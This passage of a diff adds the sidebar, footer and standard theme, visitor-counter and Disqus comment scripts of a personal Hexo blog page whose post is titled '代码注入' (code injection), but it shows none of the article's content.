nav-level-2"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E5%9C%B0%E5%9D%80"><span class="nav-number">6.</span> <span class="nav-text">引用地址</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Gao Jie"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Gao Jie</p>
+  <div class="site-description" itemprop="description">Everything gonna be fine in the end</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">51</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">75</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fenlan" title="GitHub → https://github.com/fenlan" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/fenlan96" title="Twitter → https://twitter.com/fenlan96" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/lan.fen.104" title="Facebook → https://www.facebook.com/lan.fen.104" rel="noopener" target="_blank"><i class="fab fa-facebook-f fa-fw"></i>Facebook</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://23.83.230.171" title="http://23.83.230.171" rel="noopener" target="_blank">bookshop</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.com/fenlan/ChatTool" title="https://github.com/fenlan/ChatTool" rel="noopener" target="_blank">ChatTool</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.com/fenlan/cloudcourse-web" title="https://github.com/fenlan/cloudcourse-web" rel="noopener" target="_blank">cloudcourse</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.com/fenlan/storm-nginx-log" title="https://github.com/fenlan/storm-nginx-log" rel="noopener" target="_blank">nginx实时日志统计</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Gao Jie</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://fenlan1.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "http://fenlan.github.io/2017/12/14/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/";
+    this.page.identifier = "2017/12/14/代码注入/";
+    this.page.title = "代码注入";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://fenlan1.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
